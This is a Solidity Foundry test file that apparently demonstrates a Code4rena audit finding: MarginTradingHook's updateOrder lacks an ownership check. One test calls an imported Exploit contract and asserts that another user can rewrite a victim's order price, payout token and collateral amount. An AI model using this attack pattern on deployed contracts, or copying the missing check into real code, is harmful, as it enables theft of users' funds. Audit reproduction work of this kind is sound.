// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30257-h-01-margintradinghookupdateorder-lacks-access-control-code4.sol";

/*//////////////////////////////////////////////////////////////
    INIT Capital — [H-01] MarginTradingHook#updateOrder lacks
    access control. Finding #30257 (code4rena, sashik_eth) — HIGH.
//////////////////////////////////////////////////////////////*/
contract UpdateOrderAccessControlTest is Test {
    MarginTradingHookVuln hook;
    UserWallet alice;
    UserWallet bob;

    uint256 constant ALICE_POS_ID = 1;
    uint256 constant BOB_POS_ID = 1;
    address constant WETH = address(0x111);
    uint256 constant TRIGGER_E36 = 1500e18;
    uint256 constant LIMIT_E36 = 1350e18;
    uint256 constant COLL_AMT = 10_000e18;

    function setUp() public {
        hook = new MarginTradingHookVuln();
        alice = new UserWallet(hook);
        bob = new UserWallet(hook);
    }

    /// @notice CONTROL: `cancelOrder` DOES enforce that the caller's own
    ///         position actually owns the order — Bob cannot cancel Alice's
    ///         order using his own posId. This proves the ownership check
    ///         exists and works elsewhere in the same contract.
    function test_control_cancelOrder_enforcesOwnership() public {
        alice.openPos(ALICE_POS_ID);
        uint256 orderId = alice.addStopLossOrder(ALICE_POS_ID, TRIGGER_E36, WETH, LIMIT_E36, COLL_AMT);

        bob.openPos(BOB_POS_ID);

        vm.expectRevert(bytes("INVALID_INPUT"));
        bob.cancelOrder(BOB_POS_ID, orderId);
    }

    /// @notice HARM: `updateOrder` is missing the exact same ownership check
    ///         — Bob rewrites Alice's active order using only his own posId.
    function test_updateOrder_lacksAccessControl() public {
        Exploit exploit = new Exploit();
        exploit.run();

        MarginTradingHookVuln.Order memory order = exploit.hook().getOrder(exploit.aliceOrderId());
        assertEq(order.triggerPrice_e36, exploit.ATTACKER_TRIGGER_E36(), "trigger should be attacker-controlled");
        assertEq(order.tokenOut, exploit.ATTACKER_TOKEN_OUT(), "payout token should be attacker-controlled");
        assertEq(order.collAmt, exploit.ATTACKER_COLL_AMT(), "collAmt should be attacker-controlled");
        assertEq(order.initPosId, 1, "order should still nominally belong to Alice's position");
    }
}
